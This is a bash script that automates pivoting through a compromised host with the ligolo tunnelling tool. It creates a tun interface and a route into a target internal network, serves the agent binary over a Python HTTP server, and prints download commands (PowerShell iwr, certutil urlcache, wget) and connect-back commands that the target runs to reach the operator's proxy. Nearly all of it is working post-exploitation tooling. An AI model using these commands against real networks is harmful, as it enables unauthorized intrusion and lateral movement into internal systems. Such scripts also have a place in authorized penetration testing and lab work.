#!/bin/bash
animate_echo() {
    text=$1
    for ((i = 0; i < ${#text}; i++)); do
        echo -e "\e[32m${text:$i:1}\e[0m\c"  
        sleep 0.001
    done
    echo
}
# Function to display commands
animate_command() {
    command="$1"
    echo "$command"
    eval "$command"
}

# Function to check if a port is in use and kill the process using it
check_and_kill_port() {
    local port="$1"
    local process_id=$(lsof -ti:$port)
    if [ -n "$process_id" ]; then
        sudo kill $process_id
        #animate_command "sudo kill $process_id"
        #echo "A Python process $port killed."
    fi
}
current_user=$(whoami)
animate_echo "Curent user is $current_user" | lolcat
figlet -c -f slant "Tunnel" | lolcat
echo "==========================Setting up ligolo tunnel for $current_user user=========================" | lolcat

# Check if ligolo interface already exists
if ip link show ligolo &>/dev/null; then
    animate_echo "ligolo interface already exists. Moving on to next task..."
else
    sudo ip tuntap add user $current_user mode tun ligolo
    animate_echo "Curent user is $current_user"
    #animate_command "sudo ip tuntap add user kali mode tun ligolo"
fi
sudo ip link set ligolo up
#animate_command "sudo ip link set ligolo up"

previous_ip_file="previous_ip.txt"
previous_ip=""

if [ -f "$previous_ip_file" ]; then
    previous_ip=$(cat "$previous_ip_file")
fi

if [ -n "$previous_ip" ]; then
    animate_echo "Deleting network from last usage"
    sudo ip route del $previous_ip dev ligolo
    #animate_command "sudo ip route del $previous_ip dev ligolo"
fi
echo "=================================Adding new Internal Network=================================================" | lolcat
# List available interfaces and prompt user for choice
animate_echo "Which of These Network interfaces do You Wish to Listen on? (e.g 1 ):"
interfaces=$(ip -o link show | awk -F': ' '{print $2}')
select interface in $interfaces; do
    if [ -n "$interface" ]; then
        break
    else
        echo "Invalid selection. Please choose again (Choose interface number)."
    fi
done

# Retrieve IP address of selected interface
interface_ip=$(ip -o -4 addr show dev "$interface" | awk '{print $4}' | cut -d'/' -f1)
animate_echo "you have chosen to listen on $interface with the IP $interface_ip"

read -p "Which network do you wich to tunnel to? (e.g., 172.16.34.0/24): " new_ip 
echo "$new_ip" >"$previous_ip_file"

sudo ip route add $new_ip dev ligolo
#animate_command "sudo ip route add $new_ip dev ligolo"

echo "===============================IP Table:=============================================" | lolcat
sudo ip route list
echo "Internal Network $new_ip added to routing table." | lolcat

animate_echo "Tunnel setup complete."

# Check if port 65000 is in use and kill the process if it is
check_and_kill_port 65000

# Start Python server
echo "Opening python server for file transfer..." | lolcat
python -m http.server 65000 &

# Retrieve the IP address of tun0 interface
#tun0_ip=$(ip addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

echo "Python server opened running at port 65000" | lolcat
echo ""
echo "========================Transfer agent to your target with the following comands:==============================" | lolcat
animate_echo "======================for Windows target ======================================="
echo "for powershell==> iwr -uri http://$interface_ip:65000/ligolo_agent.exe -outfile ligolo.exe"
echo "for CMD ==> certutil.exe -f -urlcache -split 'http://$interface_ip:65000/ligolo_agent.exe"
animate_echo "======================for linux target ======================================="
echo "wget http://$interface_ip:65000/ligolo_agent"
echo ""
animate_echo "=========================Connect from your target to ligolo=========================" | lolcat
animate_echo "====================== On Windows Target ===================="
echo ".\ligolo_agent.exe -connect $interface_ip:11601 -ignore-cert"
animate_echo "====================== On Linux Target ===================="
echo "./ligolo_agent -connect $interface_ip:11601 -ignore-cert"

echo ""
echo "===============================Starting ligolo...=====================================" | lolcat
./ligolo_proxy -selfcert
